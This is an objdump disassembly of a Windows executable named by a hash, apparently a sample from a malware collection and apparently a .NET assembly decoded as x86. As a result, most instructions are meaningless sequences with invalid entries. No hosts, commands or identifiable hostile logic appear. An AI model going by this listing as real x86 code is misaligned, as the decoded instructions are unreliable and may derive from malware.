
3d1ac5f16b486805bfea6e9152cc60251b7e8f4a8580187afef978347e523f46.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	pusha  
  402001:	dec    edx
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x268400,al
  402013:	add    BYTE PTR [edx+eiz*1+0x0],dh
  402017:	add    BYTE PTR [ecx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [ebp+0x2395b961],bh
  402055:	int    0x1e
  402057:	dec    esp
  402058:	push   edi
  402059:	aas    
  40205a:	loope  0x401ff0
  40205c:	and    al,0x1
  40205e:	fs xor eax,0xc21f9ad7
  402064:	mov    edi,0xb6977203
  402069:	das    
  40206a:	jae    0x402074
  40206c:	call   0xe6fa3176
  402071:	sub    ch,BYTE PTR [esi]
  402073:	jne    0x40203b
  402075:	inc    ecx
  402076:	mov    dl,BYTE PTR [esi]
  402078:	ret    
  402079:	sahf   
  40207a:	pusha  
  40207b:	ja     0x4020d8
  40207d:	shl    BYTE PTR [edx+0x57eba01d],0x56
  402084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402085:	iret   
  402086:	push   ecx
  402087:	push   0xffffffa5
  402089:	aaa    
  40208a:	int3   
  40208b:	in     al,dx
  40208c:	add    esp,ebx
  40208e:	mov    al,0xb1
  402090:	push   ds
  402091:	imul   ebx,DWORD PTR [edx],0x8bd89fb5
  402097:	out    0x74,eax
  402099:	nop
  40209a:	nop
  40209b:	test   eax,0x6be0ec3d
  4020a0:	dec    esp
  4020a1:	jg     0x402054
  4020a3:	or     DWORD PTR [edx],0xffffffb0
  4020a6:	inc    ecx
  4020a7:	pusha  
  4020a8:	inc    ebx
  4020a9:	sub    al,0xc9
  4020ab:	and    BYTE PTR [edi],bh
  4020ad:	test   BYTE PTR [esi-0x61d099f3],ch
  4020b3:	inc    eax
  4020b4:	aas    
  4020b5:	and    DWORD PTR [eax-0x5fa661c6],edi
  4020bb:	sub    eax,0xd291d6ec
  4020c0:	inc    esi
  4020c1:	inc    ebp
  4020c2:	push   es
  4020c3:	aas    
  4020c4:	fcomp  DWORD PTR [ebx]
  4020c6:	jae    0x4020e7
  4020c8:	(bad)  
  4020c9:	jmp    0x57321a9d
  4020ce:	outs   dx,DWORD PTR ds:[esi]
  4020cf:	cli    
  4020d0:	fistp  DWORD PTR [edi]
  4020d2:	mov    WORD PTR [edx+eax*2],gs
  4020d5:	jmp    0x63f50878
  4020da:	xor    DWORD PTR [ebx],0x28
  4020dd:	in     eax,dx
  4020de:	pop    ebx
  4020df:	enter  0xae2e,0xb
  4020e3:	cmp    dl,BYTE PTR [esi-0x14]
  4020e6:	jae    0x40207d
  4020e8:	mov    edx,0x114d59b1
  4020ed:	daa    
  4020ee:	or     DWORD PTR [ecx+eiz*4-0x3f3e389c],eax
  4020f5:	test   dh,cl
  4020f7:	clc    
  4020f8:	pop    edx
  4020f9:	out    0x8e,eax
  4020fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020fc:	mov    ebp,0x6df52009
  402101:	jo     0x4020a6
  402103:	push   cs
  402104:	dec    ebx
  402105:	push   esi
  402106:	ins    DWORD PTR es:[edi],dx
  402107:	loop   0x402106
  402109:	aad    0x85
  40210b:	adc    esi,eax
  40210d:	or     eax,DWORD PTR [ecx-0x2f]
  402110:	loope  0x40216c
  402112:	jmp    0x4020e3
  402114:	jbe    0x40216d
  402116:	pop    edi
  402117:	sub    dh,BYTE PTR [eax+eiz*4-0x24]
  40211b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40211c:	dec    eax
  40211d:	jo     0x402152
  40211f:	inc    esp
  402120:	cmp    DWORD PTR [ecx],0xb634189f
  402126:	jo     0x40213c
  402128:	or     dh,BYTE PTR [edx+0x4a6503ff]
  40212e:	lods   eax,DWORD PTR ds:[esi]
  40212f:	jle    0x402113
  402131:	and    BYTE PTR [ecx+0x1a],bh
  402134:	call   0x31a0:0x242c74a9
  40213b:	mov    ah,BYTE PTR [edi-0x70b19d92]
  402141:	cmp    eax,edx
  402143:	xchg   ebx,eax
  402144:	mov    cl,BYTE PTR [esp+esi*2]
  402147:	sar    BYTE PTR [ecx],1
  402149:	ja     0x402124
  40214b:	cs loope 0x4020d3
  40214e:	xchg   ebx,eax
  40214f:	adc    BYTE PTR [ebx],bl
  402151:	xor    BYTE PTR ds:0x11900,al
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [edx],eax
  40215d:	sub    BYTE PTR [ebx],al
  40215f:	add    BYTE PTR [eax],al
  402161:	push   es
  402162:	sub    eax,0xa0200a
  402167:	add    BYTE PTR [eax],al
  402169:	sub    BYTE PTR ds:0x730a0000,dl
  40216f:	push   es
  402170:	add    BYTE PTR [eax],al
  402172:	push   es
  402173:	or     al,BYTE PTR [esi]
  402175:	pop    ss
  402176:	lea    eax,[esi]
  402178:	add    BYTE PTR [eax],al
  40217a:	add    DWORD PTR [ebx],edx
  40217c:	or     BYTE PTR [ecx],dl
  40217e:	or     BYTE PTR [esi],dl
  402180:	sub    BYTE PTR [edx],al
  402182:	add    BYTE PTR [eax],al
  402184:	push   es
  402185:	mov    ds:0x16730811,al
  40218a:	add    BYTE PTR [eax],al
  40218c:	or     cl,BYTE PTR [ebx]
  40218e:	jae    0x4021a7
  402190:	add    BYTE PTR [eax],al
  402192:	or     cl,BYTE PTR ds:0x187e09
  402198:	add    BYTE PTR [edx],cl
  40219a:	outs   dx,DWORD PTR ds:[esi]
  40219b:	sbb    DWORD PTR [eax],eax
  40219d:	add    BYTE PTR [edx],cl
  40219f:	or     DWORD PTR [edi+eax*1],ecx
  4021a2:	rol    BYTE PTR [edx],1
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	add    DWORD PTR [eax],ebp
  4021a8:	sbb    al,BYTE PTR [eax]
  4021aa:	add    BYTE PTR [edx],cl
  4021ac:	or     BYTE PTR [edx+0x1],dh
  4021af:	add    BYTE PTR [eax],al
  4021b1:	jo     0x402222
  4021b3:	sbb    eax,DWORD PTR [eax]
  4021b5:	add    BYTE PTR [edx],cl
  4021b7:	es pop es
  4021b9:	outs   dx,DWORD PTR ds:[esi]
  4021ba:	sbb    al,0x0
  4021bc:	add    BYTE PTR [edx],cl
  4021be:	jle    0x4021c4
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	add    al,0x73
  4021c4:	sbb    eax,0x6f0a0000
  4021c9:	push   ds
  4021ca:	add    BYTE PTR [eax],al
  4021cc:	or     al,BYTE PTR [edi]
  4021ce:	outs   dx,DWORD PTR ds:[esi]
  4021cf:	pop    ds
  4021d0:	add    BYTE PTR [eax],al
  4021d2:	or     bh,BYTE PTR [esi+0x2]
  4021d5:	add    BYTE PTR [eax],al
  4021d7:	add    al,0x28
  4021d9:	and    BYTE PTR [eax],al
  4021db:	add    BYTE PTR [edx],cl
  4021dd:	jle    0x4021e0
  4021df:	add    BYTE PTR [eax],al
  4021e1:	add    al,0x2c
  4021e3:	or     eax,0x76f06
  4021e8:	add    BYTE PTR [esi],al
  4021ea:	outs   dx,DWORD PTR ds:[esi]
  4021eb:	and    DWORD PTR [eax],eax
  4021ed:	add    BYTE PTR [edx],cl
  4021ef:	sub    edi,DWORD PTR [eax]
  4021f1:	sbb    BYTE PTR [ebp+0x1000008],cl
  4021f7:	adc    ecx,DWORD PTR [ecx]
  4021f9:	adc    DWORD PTR [ecx],ecx
  4021fb:	push   ss
  4021fc:	sub    BYTE PTR [edx],ah
  4021fe:	add    BYTE PTR [eax],al
  402200:	or     bh,BYTE PTR [esi+0x3]
  402203:	add    BYTE PTR [eax],al
  402205:	add    al,0xfe
  402207:	push   es
  402208:	and    eax,DWORD PTR [eax]
  40220a:	add    BYTE PTR [edx],cl
  40220c:	jae    0x402232
  40220e:	add    BYTE PTR [eax],al
  402210:	or     ch,BYTE PTR [edi+0x25]
  402213:	add    BYTE PTR [eax],al
  402215:	or     ah,BYTE PTR [edx+0x6170911]
  40221b:	outs   dx,DWORD PTR ds:[esi]
  40221c:	pop    es
  40221d:	add    BYTE PTR [eax],al
  40221f:	push   es
  402220:	mov    ds:0x26280911,al
  402225:	add    BYTE PTR [eax],al
  402227:	or     ah,BYTE PTR [esi]
  402229:	pop    es
  40222a:	outs   dx,DWORD PTR ds:[esi]
  40222b:	daa    
  40222c:	add    BYTE PTR [eax],al
  40222e:	or     bl,dh
  402230:	or     al,BYTE PTR [edi]
  402232:	sub    al,0x6
  402234:	pop    es
  402235:	outs   dx,DWORD PTR ds:[esi]
  402236:	sub    BYTE PTR [eax],al
  402238:	add    BYTE PTR [edx],cl
  40223a:	(bad)  
  40223c:	xor    edx,DWORD PTR [ebx]
  40223e:	add    al,0x11
  402240:	add    al,0x28
  402242:	sub    DWORD PTR [eax],eax
  402244:	add    BYTE PTR [edx],cl
  402246:	sbb    BYTE PTR [ebx],dl
  402248:	pop    es
  402249:	fisub  WORD PTR [edi]
  40224b:	adc    eax,DWORD PTR ds:0x29280511
  402251:	add    BYTE PTR [eax],al
  402253:	or     ah,BYTE PTR [eax]
  402255:	out    0x0,eax
  402257:	add    BYTE PTR [eax],al
  402259:	adc    eax,DWORD PTR [edi]
  40225b:	ficom  WORD PTR ds:0x6110613
  402261:	jb     0x402266
  402263:	add    BYTE PTR [eax],al
  402265:	jo     0x40228f
  402267:	sub    al,BYTE PTR [eax]
  402269:	add    BYTE PTR [edx],cl
  40226b:	adc    eax,0x2de0713
  402270:	push   ss
  402271:	sub    dl,BYTE PTR [ecx]
  402273:	pop    es
  402274:	sub    al,BYTE PTR [eax]
  402276:	add    BYTE PTR [eax],al
  402278:	add    DWORD PTR [eax+eax*1],esi
  40227b:	add    BYTE PTR [edx],al
  40227d:	add    BYTE PTR [edx],dh
  40227f:	add    BYTE PTR [ebx+0xa00d5],ah
  402285:	add    BYTE PTR [eax],al
  402287:	add    BYTE PTR [eax],al
  402289:	add    BYTE PTR [eax],al
  40228b:	add    cl,ah
  40228d:	loope  0x40228f
  40228f:	push   cs
  402290:	add    BYTE PTR ss:[eax],al
  402293:	add    DWORD PTR [eax],eax
  402295:	add    BYTE PTR [eax],al
  402297:	add    cl,ah
  402299:	out    dx,eax
  40229a:	add    BYTE PTR [edx],dl
  40229c:	aaa    
  40229d:	add    BYTE PTR [eax],al
  40229f:	add    DWORD PTR [eax],eax
  4022a1:	add    BYTE PTR [eax],al
  4022a3:	add    cl,ah
  4022a5:	add    DWORD PTR [ecx],eax
  4022a7:	adc    esi,DWORD PTR ds:0x13010000
  4022ad:	xor    BYTE PTR [esi],al
  4022af:	add    BYTE PTR [eax+0x0],dl
  4022b2:	add    BYTE PTR [eax],al
  4022b4:	add    al,BYTE PTR [eax]
  4022b6:	add    BYTE PTR [ecx],dl
  4022b8:	sub    BYTE PTR [ebx],ch
  4022ba:	add    BYTE PTR [eax],al
  4022bc:	or     dh,BYTE PTR [edx+0x65]
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	jo     0x4022db
  4022c3:	lea    eax,[ecx]
  4022c5:	add    BYTE PTR [eax],al
  4022c7:	add    DWORD PTR [ebx],ecx
  4022c9:	pop    es
  4022ca:	push   ss
  4022cb:	jb     0x402340
  4022cd:	add    BYTE PTR [eax],al
  4022cf:	jo     0x402273
  4022d1:	pop    es
  4022d2:	pop    ss
  4022d3:	jg     0x4022d7
  4022d5:	add    BYTE PTR [eax],al
  4022d7:	add    al,0x72
  4022d9:	in     eax,dx
  4022da:	add    BYTE PTR [eax],al
  4022dc:	jo     0x402306
  4022de:	sub    al,0x0
  4022e0:	add    BYTE PTR [edx],cl
  4022e2:	mov    ds:0x2d2807,al
  4022e7:	add    BYTE PTR [edx],cl
  4022e9:	or     bl,BYTE PTR [edx]
  4022eb:	jb     0x4022de
  4022ed:	add    BYTE PTR [eax],al
  4022ef:	jo     0x402308
  4022f1:	lea    eax,[ecx]
  4022f3:	add    BYTE PTR [eax],al
  4022f5:	add    DWORD PTR [eax+ecx*1],ecx
  4022f8:	push   ss
  4022f9:	push   es
  4022fa:	mov    ds:0x2e2808,al
  4022ff:	add    BYTE PTR [edx],cl
  402301:	push   es
  402302:	jae    0x402333
  402304:	add    BYTE PTR [eax],al
  402306:	or     ch,BYTE PTR [edx]
  402308:	sbb    esi,DWORD PTR [eax]
  40230a:	add    al,0x0
  40230c:	mov    ch,0x0
  40230e:	add    BYTE PTR [eax],al
  402310:	add    eax,DWORD PTR [eax]
  402312:	add    BYTE PTR [ecx],dl
  402314:	add    cl,BYTE PTR [esi+0x92e1969]
  40231a:	add    cl,BYTE PTR [esi-0x67bfe597]
  402320:	add    BYTE PTR [eax],al
  402322:	add    BYTE PTR [edx],al
  402324:	push   ss
  402325:	call   0x800a:0x3073
  40232c:	add    al,0x0
  40232e:	add    BYTE PTR [edx+eax*1],al
  402331:	pop    ss
  402332:	call   0x280a:0x3128
  402339:	xor    al,BYTE PTR [eax]
  40233b:	add    BYTE PTR [edx],cl
  40233d:	add    BYTE PTR [ebx],0x0
  402340:	add    BYTE PTR [edx+eax*1],al
  402343:	sbb    BYTE PTR [edx+0x3328],bl
  402349:	or     al,BYTE PTR [eax+0x4000002]
  40234f:	add    cl,BYTE PTR [esi+0x3e331a69]
  402355:	add    bl,BYTE PTR [ecx]
  402357:	call   0x6f0a:0x2b28
  40235e:	xor    al,0x0
  402360:	add    BYTE PTR [edx],cl
  402362:	sub    BYTE PTR ds:0xa0a0000,dh
  402368:	jb     0x40237f
  40236a:	add    DWORD PTR [eax],eax
  40236c:	jo     0x402385
  40236e:	lea    eax,[ecx]
  402370:	add    BYTE PTR [eax],al
  402372:	add    DWORD PTR [ebx],edx
  402374:	add    al,0x11
  402376:	add    al,0x16
  402378:	push   es
  402379:	mov    WORD PTR [ebx],?
  40237b:	add    BYTE PTR [eax],al
  40237d:	add    DWORD PTR [edx+0x36280411],esp
  402383:	add    BYTE PTR [eax],al
  402385:	or     al,BYTE PTR [esi]
  402387:	jae    0x4023c0
  402389:	add    BYTE PTR [eax],al
  40238b:	or     cl,BYTE PTR [ebx]
  40238d:	pop    es
  40238e:	sub    BYTE PTR [eax],bh
  402390:	add    BYTE PTR [eax],al
  402392:	or     bl,dh
  402394:	adc    BYTE PTR [eax+ecx*1],cl
  402397:	jb     0x4023e0
  402399:	add    DWORD PTR [eax],eax
  40239b:	jo     0x4023c5
  40239d:	sub    al,BYTE PTR [eax]
  40239f:	add    BYTE PTR [edx],cl
  4023a1:	push   ss
  4023a2:	or     eax,0x27f22de
  4023a7:	add    BYTE PTR [eax],al
  4023a9:	add    al,0x7e
  4023ab:	cmp    DWORD PTR [eax],eax
  4023ad:	add    BYTE PTR [edx],cl
  4023af:	sub    BYTE PTR [edx],bh
  4023b1:	add    BYTE PTR [eax],al
  4023b3:	or     al,BYTE PTR [eax+0x4000001]
  4023b9:	pop    ss
  4023ba:	sub    dh,BYTE PTR [edx+0x7b]
  4023bd:	add    DWORD PTR [eax],eax
  4023bf:	jo     0x4023e9
  4023c1:	cmp    eax,DWORD PTR [eax]
  4023c3:	add    BYTE PTR [edx],cl
  4023c5:	push   ss
  4023c6:	sub    cl,BYTE PTR [ecx]
  4023c8:	sub    al,BYTE PTR [eax]
  4023ca:	add    BYTE PTR [eax],al
  4023cc:	add    DWORD PTR [eax],edx
  4023ce:	add    BYTE PTR [eax],al
  4023d0:	add    BYTE PTR [eax],al
  4023d2:	(bad)  
  4023d4:	jb     0x402357
  4023d6:	add    BYTE PTR [eax],dl
  4023d8:	xor    eax,0x1e010000
  4023dd:	push   ss
  4023de:	add    BYTE PTR [ecx],0x0
  4023e1:	add    BYTE PTR [edx+ebp*1],al
  4023e4:	push   ds
  4023e5:	add    ch,BYTE PTR [eax]
  4023e7:	cmp    al,0x0
  4023e9:	add    BYTE PTR [edx],cl
  4023eb:	sub    cl,BYTE PTR [edx+0x2]
  4023ee:	sub    BYTE PTR [eax+eax*1],bh
  4023f1:	add    BYTE PTR [edx],cl
  4023f3:	add    dh,BYTE PTR [ebx+0x3e]
  4023f6:	add    BYTE PTR [eax],al
  4023f8:	or     bh,BYTE PTR [ebp+0x5]
  4023fb:	add    BYTE PTR [eax],al
  4023fd:	add    al,0x2a
  4023ff:	xor    al,BYTE PTR [edx]
  402401:	jnp    0x402408
  402403:	add    BYTE PTR [eax],al
  402405:	add    al,0x6f
  402407:	aas    
  402408:	add    BYTE PTR [eax],al
  40240a:	or     ch,BYTE PTR [edx]
  40240c:	sbb    ch,BYTE PTR [eax]
  40240e:	inc    eax
  40240f:	add    BYTE PTR [eax],al
  402411:	or     ch,BYTE PTR [edx]
  402413:	push   0x2
  402415:	jnp    0x40241c
  402417:	add    BYTE PTR [eax],al
  402419:	add    al,0x17
  40241b:	outs   dx,DWORD PTR ds:[esi]
  40241c:	inc    ecx
  40241d:	add    BYTE PTR [eax],al
  40241f:	or     ch,BYTE PTR ds:0xf1721a0b
  402425:	add    DWORD PTR [eax],eax
  402427:	jo     0x402451
  402429:	inc    edx
  40242a:	add    BYTE PTR [eax],al
  40242c:	or     ch,BYTE PTR [edx]
  40242e:	add    BYTE PTR [eax],al
  402430:	sbb    esi,DWORD PTR [eax]
  402432:	push   es
  402433:	add    al,cl
  402435:	add    BYTE PTR [eax],al
  402437:	add    BYTE PTR [eax+eax*1],al
  40243a:	add    BYTE PTR [ecx],dl
  40243c:	sbb    dh,BYTE PTR [edx+0x61]
  40243f:	add    al,BYTE PTR [eax]
  402441:	jo     0x40246b
  402443:	inc    ebx
  402444:	add    BYTE PTR [eax],al
  402446:	or     ch,BYTE PTR [eax]
  402448:	inc    esp
  402449:	add    BYTE PTR [eax],al
  40244b:	or     al,BYTE PTR [ebx]
  40244d:	add    al,0x5
  40244f:	push   cs
  402450:	add    al,0xe
  402452:	add    eax,0x456f
  402457:	or     cl,BYTE PTR [edx]
  402459:	sbb    dh,BYTE PTR [edx-0x45]
  40245c:	add    al,BYTE PTR [eax]
  40245e:	jo     0x402488
  402460:	inc    ebx
  402461:	add    BYTE PTR [eax],al
  402463:	or     al,BYTE PTR [esi]
  402465:	adc    eax,DWORD PTR [edi]
  402467:	fst    QWORD PTR [ebp+0xb000000]
  40246d:	pop    es
  40246e:	jb     0x40248d
  402470:	add    eax,DWORD PTR [eax]
  402472:	jo     0x40249c
  402474:	sub    al,BYTE PTR [eax]
  402476:	add    BYTE PTR [edx],cl
  402478:	jae    0x4024c0
  40247a:	add    BYTE PTR [eax],al
  40247c:	or     cl,BYTE PTR ds:0x476f0709
  402482:	add    BYTE PTR [eax],al
  402484:	or     ch,BYTE PTR [edi+0x48]
  402487:	add    BYTE PTR [eax],al
  402489:	or     cl,BYTE PTR [ecx]
  40248b:	pop    es
  40248c:	outs   dx,DWORD PTR ds:[esi]
  40248d:	dec    ecx
  40248e:	add    BYTE PTR [eax],al
  402490:	or     ch,BYTE PTR [edi+0x4a]
  402493:	add    BYTE PTR [eax],al
  402495:	or     cl,BYTE PTR [ecx]
  402497:	or     al,0x8
  402499:	pop    es
  40249a:	outs   dx,DWORD PTR ds:[esi]
  40249b:	dec    ecx
  40249c:	add    BYTE PTR [eax],al
  40249e:	or     dh,BYTE PTR [ebx+0x4b]
  4024a1:	add    BYTE PTR [eax],al
  4024a3:	or     dh,BYTE PTR [edx-0x7f]
  4024a6:	add    eax,DWORD PTR [eax]
  4024a8:	jo     0x4024d2
  4024aa:	dec    esp
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	or     ah,BYTE PTR [esi]
  4024af:	adc    al,0x13
  4024b1:	pop    es
  4024b2:	fimul  WORD PTR [ebp+0x13]
  4024b5:	add    al,0x11
  4024b7:	add    al,0x72
  4024b9:	sbb    al,0x4
  4024bb:	add    BYTE PTR [eax+0x28],dh
  4024be:	sub    al,BYTE PTR [eax]
  4024c0:	add    BYTE PTR [edx],cl
  4024c2:	jae    0x40250a
  4024c4:	add    BYTE PTR [eax],al
  4024c6:	or     dl,BYTE PTR [ebx]
  4024c8:	push   es
  4024c9:	adc    DWORD PTR [esi],eax
  4024cb:	sbb    eax,0x486f
  4024d0:	or     dl,BYTE PTR [ecx]
  4024d2:	push   es
  4024d3:	adc    DWORD PTR [edi+ebp*2],eax
  4024d6:	dec    ecx
  4024d7:	add    BYTE PTR [eax],al
  4024d9:	or     ch,BYTE PTR [edi+0x4a]
  4024dc:	add    BYTE PTR [eax],al
  4024de:	or     dl,BYTE PTR [ecx]
  4024e0:	push   es
  4024e1:	adc    eax,DWORD PTR ds:0x4110511
  4024e7:	outs   dx,DWORD PTR ds:[esi]
  4024e8:	dec    ecx
  4024e9:	add    BYTE PTR [eax],al
  4024eb:	or     dh,BYTE PTR [ebx+0x4b]
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	or     dh,BYTE PTR [edx+0x68]
  4024f3:	add    al,0x0
  4024f5:	jo     0x40251f
  4024f7:	dec    esp
  4024f8:	add    BYTE PTR [eax],al
  4024fa:	or     ah,BYTE PTR [esi]
  4024fc:	adc    al,0x13
  4024fe:	pop    es
  4024ff:	fiadd  WORD PTR [eax]
  402501:	adc    DWORD PTR [edi],eax
  402503:	sub    al,BYTE PTR [ecx]
  402505:	sbb    al,0x0
  402507:	add    BYTE PTR [eax],al
  402509:	add    BYTE PTR [eax],al
  40250b:	add    BYTE PTR [eax],dh
  40250d:	xor    BYTE PTR [eax],al
  40250f:	dec    eax
  402510:	inc    ebx
  402511:	add    BYTE PTR [eax],al
  402513:	add    DWORD PTR [eax],eax
  402515:	add    BYTE PTR [eax],al
  402517:	add    BYTE PTR [eax],dh
  402519:	js     0x40251b
  40251b:	dec    ebp
  40251c:	xor    eax,0x1b010000
  402521:	xor    BYTE PTR [edx],al
  402523:	add    BYTE PTR [ecx+0x5000000],bh
  402529:	add    BYTE PTR [eax],al
  40252b:	adc    DWORD PTR [edx+ecx*1],edx
  40252e:	sbb    dh,BYTE PTR [edx-0x15]
  402531:	add    al,0x0
  402533:	jo     0x40255d
  402535:	inc    ebx
  402536:	add    BYTE PTR [eax],al
  402538:	or     ch,BYTE PTR [eax]
  40253a:	inc    esp
  40253b:	add    BYTE PTR [eax],al
  40253d:	or     ch,BYTE PTR [edi+0x4d]
  402540:	add    BYTE PTR [eax],al
  402542:	or     cl,BYTE PTR [edx]
  402544:	sbb    dh,BYTE PTR [edx+0x6e]
  402547:	add    eax,0x43287000
  40254c:	add    BYTE PTR [eax],al
  40254e:	or     bl,ch
  402550:	pop    DWORD PTR [eax]
  402552:	add    BYTE PTR [eax],al
  402554:	or     eax,DWORD PTR [edi]
  402556:	jb     0x402575
  402558:	add    eax,DWORD PTR [eax]
  40255a:	jo     0x402584
  40255c:	sub    al,BYTE PTR [eax]
  40255e:	add    BYTE PTR [edx],cl
  402560:	jae    0x4025a8
  402562:	add    BYTE PTR [eax],al
  402564:	or     cl,BYTE PTR ds:0x476f0709
  40256a:	add    BYTE PTR [eax],al
  40256c:	or     ch,BYTE PTR [edi+0x48]
  40256f:	add    BYTE PTR [eax],al
  402571:	or     cl,BYTE PTR [ecx]
  402573:	pop    es
  402574:	outs   dx,DWORD PTR ds:[esi]
  402575:	dec    ecx
  402576:	add    BYTE PTR [eax],al
  402578:	or     ch,BYTE PTR [edi+0x4a]
  40257b:	add    BYTE PTR [eax],al
  40257d:	or     cl,BYTE PTR [ecx]
  40257f:	or     al,0x8
  402581:	pop    es
  402582:	outs   dx,DWORD PTR ds:[esi]
  402583:	dec    ecx
  402584:	add    BYTE PTR [eax],al
  402586:	or     dh,BYTE PTR [ebx+0x4b]
  402589:	add    BYTE PTR [eax],al
  40258b:	or     dh,BYTE PTR [edx-0x1c]
  40258e:	add    eax,0x4c287000
  402593:	add    BYTE PTR [eax],al
  402595:	or     ah,BYTE PTR [esi]
  402597:	fimul  WORD PTR [edx+0x13]
  40259a:	add    al,0x11
  40259c:	add    al,0x72
  40259e:	sbb    al,0x4
  4025a0:	add    BYTE PTR [eax+0x28],dh
  4025a3:	sub    al,BYTE PTR [eax]
  4025a5:	add    BYTE PTR [edx],cl
  4025a7:	jae    0x4025ef
  4025a9:	add    BYTE PTR [eax],al
  4025ab:	or     dl,BYTE PTR [ebx]
  4025ad:	push   es
  4025ae:	adc    DWORD PTR [esi],eax
  4025b0:	sbb    eax,0x486f
  4025b5:	or     dl,BYTE PTR [ecx]
  4025b7:	push   es
  4025b8:	adc    DWORD PTR [edi+ebp*2],eax
  4025bb:	dec    ecx
  4025bc:	add    BYTE PTR [eax],al
  4025be:	or     ch,BYTE PTR [edi+0x4a]
  4025c1:	add    BYTE PTR [eax],al
  4025c3:	or     dl,BYTE PTR [ecx]
  4025c5:	push   es
  4025c6:	adc    eax,DWORD PTR ds:0x4110511
  4025cc:	outs   dx,DWORD PTR ds:[esi]
  4025cd:	dec    ecx
  4025ce:	add    BYTE PTR [eax],al
  4025d0:	or     dh,BYTE PTR [ebx+0x4b]
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	or     dh,BYTE PTR [edx+0x7f]
  4025d8:	push   es
  4025d9:	add    BYTE PTR [eax+0x28],dh
  4025dc:	dec    esp
  4025dd:	add    BYTE PTR [eax],al
  4025df:	or     ah,BYTE PTR [esi]
  4025e1:	fiadd  WORD PTR [eax]
  4025e3:	push   es
  4025e4:	sub    al,BYTE PTR [eax]
  4025e6:	add    BYTE PTR [eax],al
  4025e8:	add    DWORD PTR [eax+eax*1],ebx
  4025eb:	add    BYTE PTR [eax],al
  4025ed:	add    BYTE PTR [edx],al
  4025ef:	add    BYTE PTR [esi],ah
  4025f1:	sub    BYTE PTR [eax],al
  4025f3:	inc    ebp
  4025f4:	inc    ebx
  4025f5:	add    BYTE PTR [eax],al
  4025f7:	add    DWORD PTR [eax],eax
  4025f9:	add    BYTE PTR [edx],al
  4025fb:	add    BYTE PTR [esi],ah
  4025fd:	ins    DWORD PTR es:[edi],dx
  4025fe:	add    BYTE PTR [edx+0x35],cl
  402601:	add    BYTE PTR [eax],al
  402603:	add    DWORD PTR [esi],ebp
  402605:	sub    BYTE PTR [eax+eax*1+0x0],al
  402609:	or     ch,BYTE PTR [edi+0x4e]
  40260c:	add    BYTE PTR [eax],al
  40260e:	or     ch,BYTE PTR [edx]
  402610:	inc    esi
  402611:	sbb    dh,BYTE PTR [edx+0x1c]
  402614:	pop    es
  402615:	add    BYTE PTR [eax+0x28],dh
  402618:	inc    ebx
  402619:	add    BYTE PTR [eax],al
  40261b:	or     ch,BYTE PTR [eax]
  40261d:	dec    edi
  40261e:	add    BYTE PTR [eax],al
  402620:	or     ch,BYTE PTR [edx]
  402622:	add    eax,DWORD PTR es:[eax*1+0x5028]
  40262a:	or     ch,BYTE PTR [edx]
  40262c:	sbb    esi,DWORD PTR [eax]
  40262e:	add    eax,DWORD PTR [eax]
  402630:	aaa    
  402631:	add    BYTE PTR [eax],al
  402633:	add    BYTE PTR [esi],al
  402635:	add    BYTE PTR [eax],al
  402637:	adc    DWORD PTR [ebx],eax
  402639:	sub    al,0x30
  40263b:	add    ebx,DWORD PTR [edx]
  40263d:	cs sub al,0x3
  402640:	sub    BYTE PTR [edx],dh
  402642:	add    BYTE PTR [eax],al
  402644:	or     ch,BYTE PTR [edi+0x51]
  402647:	add    BYTE PTR [eax],al
  402649:	or     ch,BYTE PTR [edi+0x52]
  40264c:	add    BYTE PTR [eax],al
  40264e:	or     cl,BYTE PTR [ebx]
  402650:	ficomp WORD PTR [ebx]
  402652:	or     al,BYTE PTR [esi]
  402654:	jb     0x4025da
  402656:	pop    es
  402657:	add    BYTE PTR [eax+0x3],dh
  40265a:	mov    WORD PTR [ebx],?
  40265c:	add    BYTE PTR [eax],al
  40265e:	add    DWORD PTR [eax],ebp
  402660:	push   ebx
  402661:	add    BYTE PTR [eax],al
  402663:	or     ch,BYTE PTR [eax]
  402665:	sub    al,BYTE PTR [eax]
  402667:	add    BYTE PTR [edx],cl
  402669:	fiadd  WORD PTR [eax]
  40266b:	adc    al,0x2a
  40266d:	pop    es
  40266e:	sub    al,BYTE PTR [eax]
  402670:	add    DWORD PTR [eax],edx
  402672:	add    BYTE PTR [eax],al
  402674:	add    BYTE PTR [eax],al
  402676:	pop    es
  402677:	add    BYTE PTR [ebx],dl
  402679:	sbb    al,BYTE PTR [eax]
  40267b:	sbb    DWORD PTR ds:0xa010000,esi
  402681:	pop    ss
  402682:	sub    al,BYTE PTR [eax]
  402684:	inc    edx
  402685:	push   ebx
  402686:	dec    edx
  402687:	inc    edx
  402688:	add    DWORD PTR [eax],eax
  40268a:	add    DWORD PTR [eax],eax
  40268c:	add    BYTE PTR [eax],al
  40268e:	add    BYTE PTR [eax],al
  402690:	or     al,0x0
  402692:	add    BYTE PTR [eax],al
  402694:	jbe    0x4026ca
  402696:	xor    BYTE PTR cs:[esi],ch
  402699:	xor    esi,DWORD PTR [eax]
  40269b:	xor    esi,DWORD PTR [ecx]
  40269d:	cmp    DWORD PTR [eax],eax
  40269f:	add    BYTE PTR [eax],al
  4026a1:	add    BYTE PTR ds:0x6c00,al
  4026a7:	add    BYTE PTR [esi+eax*1+0x0],dh
  4026ab:	add    BYTE PTR [ebx],ah
  4026ad:	jle    0x4026af
  4026af:	add    al,ah
  4026b1:	push   es
